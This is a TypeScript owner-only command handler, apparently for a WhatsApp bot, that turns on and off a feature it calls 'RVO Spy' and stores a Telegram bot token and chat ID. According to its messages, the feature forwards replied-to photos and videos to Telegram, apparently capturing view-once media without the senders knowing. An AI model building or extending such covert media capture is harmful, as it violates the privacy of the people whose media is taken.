import axios from 'axios'
import fs    from 'fs'
import path  from 'path'
import { fileURLToPath } from 'url'
import { getTgToken, getTgChatId } from '../../Library/tg_global.js'

const __dirname   = path.dirname(fileURLToPath(import.meta.url as string))
const CONFIG_PATH = path.join(__dirname, '../../data/rvo_tg.json')

function loadCfg() {
  try {
    if (!fs.existsSync(CONFIG_PATH)) {
      const def = { enabled: false, token: '', chatId: '' }
      fs.writeFileSync(CONFIG_PATH, JSON.stringify(def, null, 2))
      return def
    }
    return JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf-8'))
  } catch { return { enabled: false, token: '', chatId: '' } }
}

function saveCfg(data: unknown[]) {
  try { fs.writeFileSync(CONFIG_PATH, JSON.stringify(data, null, 2)) } catch {}
}

const handler = async (m: any, { reply, args }: any) => {
  const sub = args[0]?.toLowerCase()
  const cfg = loadCfg()

  
  if (!sub) {
    return reply(
      `╭──「 🔓 *RVO Spy* 」\n` +
      `│\n` +
      `│ Status  : ${cfg.enabled ? '✅ ON' : '❌ OFF'}\n` +
      `│ Token   : ${getTgToken() || cfg.token  ? '✅ Set' : '❌ Belum'}\n` +
      `│ Chat ID : ${getTgChatId() || cfg.chatId ? `✅ ${getTgChatId() || cfg.chatId}` : '❌ Belum'}\n` +
      `│\n` +
      `│ .rvo on\n` +
      `│ .rvo off\n` +
      `│ .rvo token <TOKEN>\n` +
      `│ .rvo id <CHAT_ID>\n` +
      `│ .rvoreset token\n` +
      `│ .rvoreset id\n` +
      `│ .rvoreset all\n` +
      `╰─────────────────────`
    )
  }

  
  if (sub === 'on') {
    const _tok = getTgToken() || cfg.token || ''
    const _cid = getTgChatId() || cfg.chatId || ''
    if (!_tok || !_cid) return reply('❌ Set token & id dulu!\n.tgbot token <TOKEN>\n.tgbot id <ID>')
    cfg.enabled = true
    saveCfg(cfg)
    return reply('✅ *RVO Spy aktif!*\n\nSetiap foto/video yang di-reply\nakan dikirim ke Telegram.')
  }

  
  if (sub === 'off') {
    cfg.enabled = false
    saveCfg(cfg)
    return reply('❌ RVO Spy *dimatikan.*')
  }

  
  if (sub === 'token') {
    const val = args.slice(1).join(' ').trim()
    if (!val) return reply('❌ Format: .rvo token <TOKEN_BOT_TELEGRAM>')
    cfg.token = val
    saveCfg(cfg)
    return reply(`✅ Token disimpan!\nPreview: ${val.slice(0, 12)}...`)
  }

  
  if (sub === 'id') {
    const val = args.slice(1).join(' ').trim()
    if (!val) return reply('❌ Format: .rvo id <CHAT_ID>')
    cfg.chatId = val
    saveCfg(cfg)
    return reply(`✅ Chat ID disimpan: ${val}`)
  }

  return reply('❌ Tidak dikenal.\nKetik *.rvo* untuk bantuan.')
}

handler.command = ['rvo']
handler.owner   = true
handler.noLimit = true
handler.tags    = ['owner']
handler.help    = ['rvo on/off', 'rvo token <TOKEN>', 'rvo id <ID>']

export default handler